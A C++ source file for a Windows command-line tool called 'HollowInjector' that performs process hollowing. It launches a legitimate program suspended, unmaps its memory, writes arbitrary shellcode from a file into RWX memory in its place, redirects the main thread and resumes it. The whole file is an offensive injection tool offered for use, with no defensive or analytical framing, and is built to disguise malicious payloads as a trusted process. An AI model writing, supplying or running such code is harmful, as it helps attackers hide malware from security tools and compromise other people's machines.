#include <windows.h>
#include <iostream>
#include <fstream>
#include <vector>

// Function to read shellcode
std::vector<unsigned char> ReadShellcode(const char* filename) {
    std::ifstream file(filename, std::ios::binary);
    return std::vector<unsigned char>((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
}

// Process Hollowing: Create suspended process, unmap memory, inject payload, resume
bool ProcessHollowing(const char* targetExe, const char* shellcodePath) {
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;

    // Create suspended process
    if (!CreateProcessA(targetExe, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        std::cout << "Error creating suspended process." << std::endl;
        return false;
    }

    // Read shellcode
    auto shellcode = ReadShellcode(shellcodePath);
    if (shellcode.empty()) {
        std::cout << "Error reading shellcode." << std::endl;
        TerminateProcess(pi.hProcess, 0);
        return false;
    }

    // Get main thread context
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(pi.hThread, &ctx)) {
        std::cout << "Error getting context." << std::endl;
        TerminateProcess(pi.hProcess, 0);
        return false;
    }

    // Unmap process memory (ZwUnmapViewOfSection)
    PVOID imageBase = (PVOID)(ctx.Rdx); // Image base in Rdx for x64
    SIZE_T dummy;
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    auto ZwUnmapViewOfSection = (NTSTATUS(NTAPI*)(HANDLE, PVOID))GetProcAddress(hNtdll, "ZwUnmapViewOfSection");
    if (ZwUnmapViewOfSection(pi.hProcess, imageBase) != 0) {
        std::cout << "Error unmapping memory." << std::endl;
        TerminateProcess(pi.hProcess, 0);
        return false;
    }

    // Allocate new memory for shellcode
    PVOID newBase = VirtualAllocEx(pi.hProcess, imageBase, shellcode.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!newBase) {
        std::cout << "Error allocating new memory." << std::endl;
        TerminateProcess(pi.hProcess, 0);
        return false;
    }

    // Write shellcode
    if (!WriteProcessMemory(pi.hProcess, newBase, shellcode.data(), shellcode.size(), &dummy)) {
        std::cout << "Error writing shellcode." << std::endl;
        TerminateProcess(pi.hProcess, 0);
        return false;
    }

    // Update PEB to point to new base
    // (Simplified; in production, patch PEB correctly)
    ctx.Rcx = (DWORD64)newBase; // Entry point

    // Set new context
    if (!SetThreadContext(pi.hThread, &ctx)) {
        std::cout << "Error setting context." << std::endl;
        TerminateProcess(pi.hProcess, 0);
        return false;
    }

    // Resume thread
    if (ResumeThread(pi.hThread) == -1) {
        std::cout << "Error resuming thread." << std::endl;
        TerminateProcess(pi.hProcess, 0);
        return false;
    }

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return true;
}

int main(int argc, char* argv[]) {
    if (argc < 3) {
        std::cout << "Usage: HollowInjector.exe <legitimate_exe> <shellcode.bin>" << std::endl;
        return 1;
    }

    if (ProcessHollowing(argv[1], argv[2])) {
        std::cout << "Process Hollowing successful." << std::endl;
    } else {
        std::cout << "Error in Process Hollowing." << std::endl;
    }
    return 0;
}